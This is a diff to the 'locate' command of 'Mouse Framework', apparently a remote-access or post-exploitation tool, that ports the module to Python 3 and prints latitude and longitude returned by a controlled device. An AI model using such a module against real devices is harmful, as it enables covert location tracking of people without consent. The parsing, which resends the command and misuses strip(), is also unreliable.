@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 #            ---------------------------------------------------
 #                              Mouse Framework                                 
@@ -18,10 +18,18 @@
 #        You should have received a copy of the GNU General Public License
 #        along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
+import core.helper as h
+
 class command:
     def __init__(self):
         self.name = "locate"
-        self.description = "Get device location coordinates."
+        self.description = "Locate device."
     
     def run(self,session,cmd_data):
-        print session.send_command(cmd_data)
+        if session.send_command(cmd_data).decode().split("\n")[0] == "Unable to get Coordinates":
+            h.info_error("Failed to locate device!")
+        else:
+            latitude = session.send_command(cmd_data).decode().split("\n")[0].strip("Latitude : ")
+            longitude = session.send_command(cmd_data).decode().split("\n")[1].strip("Longitude : ")
+            print("Latitude: "+latitude)
+            print("Longitude: "+longitude)
